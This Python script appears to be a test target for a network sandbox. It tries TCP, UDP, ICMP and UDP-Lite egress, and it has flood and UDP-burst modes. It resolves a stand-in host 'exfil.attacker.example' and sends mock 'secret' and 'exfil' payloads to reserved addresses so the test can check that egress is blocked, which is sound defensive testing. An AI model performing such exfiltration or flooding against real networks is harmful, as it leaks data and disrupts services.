"""A target that tries to reach the network every way a process without capabilities can.

Not a server: it makes its attempts, prints what it saw locally as one JSON object and exits.
What the sandbox recorded is the test's to compare against the plan below. With ``--flood N``
it sends ICMP echo to N distinct addresses instead, to fill a set past its size; with
``--udp-burst N``, N datagrams to one destination as fast as it can, faster than the sink may
read them.
"""

import json
import socket
import struct
import sys
import time

IPPROTO_UDPLITE = 136


def attempt(action):
    try:
        return action()
    except OSError as exc:
        return f"{type(exc).__name__}: {exc.strerror or exc}"


def resolve():
    infos = socket.getaddrinfo("exfil.attacker.example", 443, type=socket.SOCK_STREAM)
    return sorted({info[4][0] for info in infos})


def tcp(family, address, port, payload):
    with socket.socket(family, socket.SOCK_STREAM) as sock:
        sock.settimeout(2)
        sock.connect((address, port))
        sock.sendall(payload)
    return "connected"


def udp(family, address, port, payload, protocol=0):
    with socket.socket(family, socket.SOCK_DGRAM, protocol) as sock:
        sock.sendto(payload, (address, port))
    return "sent"


def ping(family, address):
    protocol = socket.IPPROTO_ICMPV6 if family == socket.AF_INET6 else socket.IPPROTO_ICMP
    kind = 128 if family == socket.AF_INET6 else 8
    with socket.socket(family, socket.SOCK_DGRAM, protocol) as sock:
        sock.sendto(struct.pack("!BBHHH", kind, 0, 0, 0, 1), (address, 0))
    return "sent"


def main():
    if len(sys.argv) == 3 and sys.argv[1] == "--flood":
        count = int(sys.argv[2])
        for n in range(count):
            attempt(lambda n=n: ping(socket.AF_INET, f"198.18.{n // 250}.{n % 250 + 1}"))
        print(json.dumps({"flooded": count}))
        return 0
    if len(sys.argv) == 3 and sys.argv[1] == "--udp-burst":
        count = int(sys.argv[2])
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            for n in range(count):
                attempt(lambda n=n: sock.sendto(b"burst %d" % n, ("203.0.113.9", 9999)))
        print(json.dumps({"burst": count}))
        return 0
    seen = {"resolved": attempt(resolve)}
    seen["tcp_resolved"] = attempt(lambda: tcp(socket.AF_INET, "198.51.100.1", 443, b"secret"))
    seen["tcp6"] = attempt(lambda: tcp(socket.AF_INET6, "2001:db8::77", 8443, b"secret6"))
    seen["udp4"] = attempt(lambda: udp(socket.AF_INET, "203.0.113.9", 9999, b"udp-exfil"))
    seen["udp4_second"] = attempt(lambda: udp(socket.AF_INET, "198.51.100.4", 4444, b"udp-second"))
    seen["udp6"] = attempt(lambda: udp(socket.AF_INET6, "2001:db8::99", 5353, b"udp6-exfil"))
    seen["icmp4"] = attempt(lambda: ping(socket.AF_INET, "203.0.113.7"))
    seen["icmp6"] = attempt(lambda: ping(socket.AF_INET6, "2001:db8::7"))
    seen["udplite"] = attempt(
        lambda: udp(socket.AF_INET, "203.0.113.8", 7, b"lite", IPPROTO_UDPLITE)
    )
    time.sleep(0.2)
    print(json.dumps(seen, sort_keys=True))
    return 0


if __name__ == "__main__":
    sys.exit(main())
